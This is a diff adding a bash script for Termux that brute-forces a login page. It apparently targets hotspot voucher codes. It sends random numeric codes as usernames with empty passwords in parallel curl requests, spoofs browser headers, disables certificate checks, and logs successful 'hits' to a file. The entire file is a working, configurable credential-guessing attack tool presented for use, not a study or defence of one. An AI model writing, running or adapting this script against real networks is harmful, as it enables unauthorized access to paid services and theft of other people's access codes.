@@ -1,0 +1,140 @@
+#!/data/data/com.termux/files/usr/bin/bash
+set -uo pipefail
+
+# colors
+GREEN=$'\033[1;32m'
+RED=$'\033[1;31m'
+YELLOW=$'\033[1;33m'
+RESET=$'\033[0m'
+
+# ---- CONFIG (change these if you want) ----
+CONCURRENCY=30         # number of parallel curl jobs (increase if your network/VPS can handle it)
+BATCH_SIZE=200         # generate this many codes at once, then dispatch them
+TIMEOUT=6              # curl max seconds per request
+RETRY=1                # curl retries (0 or 1 recommended)
+OUTPUT_FILE="hits.txt" # save interesting responses here
+VERBOSE=0              # 0 = only print non-200 responses or matches, 1 = print all
+# -------------------------------------------
+
+read -rp $'\n'"${GREEN}Enter your network URL (e.g. http://n.com/login): ${RESET}" TARGET_URL
+clear
+read -rp $'Enter the number of digits in the code (for example 10): \n> ' CODE_LENGTH
+clear
+read -rp $'Optional: enter prefix to reduce the search space (press Enter to skip): \n> ' PREFIX
+PREFIX=${PREFIX:-""}
+clear
+read -rp $'Concurrency (recommended 10-80): \n> ' input && CONCURRENCY=${input:-$CONCURRENCY} || true
+read -rp $'Batch size (recommended 50-500): \n> ' input && BATCH_SIZE=${input:-$BATCH_SIZE} || true
+clear
+
+# headers (you can edit these)
+HEADER_ACCEPT="Accept: */*"
+HEADER_LANG="Accept-Language: ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
+HEADER_CONN="Connection: keep-alive"
+HEADER_REFERER="Referer: http://g.com/index.html"
+HEADER_UA="User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
+
+echo
+echo "${YELLOW}Starting... Press Ctrl+C to stop.${RESET}"
+echo "Target: $TARGET_URL"
+echo "Code length: $CODE_LENGTH digits"
+[ -n "$PREFIX" ] && echo "Using prefix filter: $PREFIX"
+echo "Concurrency: $CONCURRENCY  Batch size: $BATCH_SIZE  Timeout: ${TIMEOUT}s"
+echo "Saving hits to: $OUTPUT_FILE"
+echo
+
+# create fifo semaphore for job control
+FIFO="/tmp/sem.$$"
+mkfifo "$FIFO"
+# feed tokens equal to concurrency
+exec 6<> "$FIFO"
+rm "$FIFO"   # FD6 stays open
+for ((i=0;i<CONCURRENCY;i++)); do
+  printf '\n' >&6
+done
+
+# function to perform single request
+do_request() {
+  local code="$1"
+  # do the request quietly, only capture HTTP code and body (limited)
+  # -sS silent but show errors, -m timeout
+  RESPONSE_STR=$(curl -sS -G --insecure --http1.1 \
+    -H "$HEADER_ACCEPT" \
+    -H "$HEADER_LANG" \
+    -H "$HEADER_CONN" \
+    -H "$HEADER_REFERER" \
+    -H "$HEADER_UA" \
+    --max-time "$TIMEOUT" --retry "$RETRY" --retry-connrefused \
+    --data-urlencode "username=$code" \
+    --data-urlencode "password=" \
+    --data-urlencode "var=callBack" \
+    --data-urlencode "domain=400K/900K" \
+    "$TARGET_URL" 2>&1) || CURL_EXIT=$? && CURL_EXIT=${CURL_EXIT:-0}
+
+  # minimal inspection: you can change this condition to detect "success" phrases, redirects, status codes etc.
+  # We treat non-empty responses that differ from usual as interesting. Adjust to your target.
+  if [ $CURL_EXIT -ne 0 ]; then
+    printf "%b[ERR]%b code=%s curlerr=%s\n" "$RED" "$RESET" "$code" "${RESPONSE_STR}" 
+  else
+    # If verbose, print everything
+    if [ "$VERBOSE" -eq 1 ]; then
+      printf "Response for %s: %.120s\n" "$code" "$RESPONSE_STR"
+    else
+      # If response contains "301" or "Location:" or any HTTP status string you care about, print it.
+      # Also print if response length is large (you said a "big card" appears) -> use length threshold
+      local len=${#RESPONSE_STR}
+      if printf '%s' "$RESPONSE_STR" | grep -qi "301\|location:" >/dev/null 2>&1 || [ "$len" -gt 120 ]; then
+        printf "%b[HIT]%b code=%s len=%d snippet=%.140s\n" "$GREEN" "$RESET" "$code" "$len" "$(printf '%s' "$RESPONSE_STR" | tr '\n' ' ' )"
+        printf "%s | %s\n" "$(date --iso-8601=seconds)" "$code" >> "$OUTPUT_FILE"
+        printf "%s\n" "$(printf '%s' "$RESPONSE_STR" | tr '\n' ' ' )" >> "${OUTPUT_FILE}.responses"
+      fi
+    fi
+  fi
+}
+
+# generate random numeric codes in batches and dispatch
+while true; do
+  # generate batch of numbers, apply prefix if provided
+  # We'll generate BATCH_SIZE codes, each CODE_LENGTH digits, with optional PREFIX enforcement.
+  codes=()
+  for ((i=0;i<BATCH_SIZE;i++)); do
+    # generate random numeric string; faster to use openssl if available, fallback to /dev/urandom
+    if command -v openssl >/dev/null 2>&1; then
+      num=$(openssl rand -hex 8 | tr -dc '0-9' | head -c "$CODE_LENGTH")
+      # ensure length
+      while [ "${#num}" -lt "$CODE_LENGTH" ]; do
+        num="$num$(openssl rand -hex 4 | tr -dc '0-9')"
+        num=${num:0:$CODE_LENGTH}
+      done
+    else
+      num=$(tr -dc '0-9' </dev/urandom | head -c "$CODE_LENGTH")
+    fi
+
+    # if PREFIX set, enforce it
+    if [ -n "$PREFIX" ]; then
+      # ensure prefix length <= code length
+      if [ "${#PREFIX}" -le "$CODE_LENGTH" ]; then
+        num="${PREFIX}$(tr -dc '0-9' </dev/urandom | head -c $((CODE_LENGTH - ${#PREFIX})))"
+      fi
+    fi
+    codes+=("$num")
+  done
+
+  # dispatch each code, but obey concurrency via semaphore FD6
+  for code in "${codes[@]}"; do
+    # wait for token (reads a newline from FD6)
+    read -r -u6 _ || true
+    {
+      do_request "$code"
+      # return token
+      printf '\n' >&6
+    } &
+
+  done
+
+  # prevent busy loop: small sleep optional
+  sleep 0.08
+done
+
+# cleanup (not reachable normally)
+exec 6>&- 2>/dev/null || true
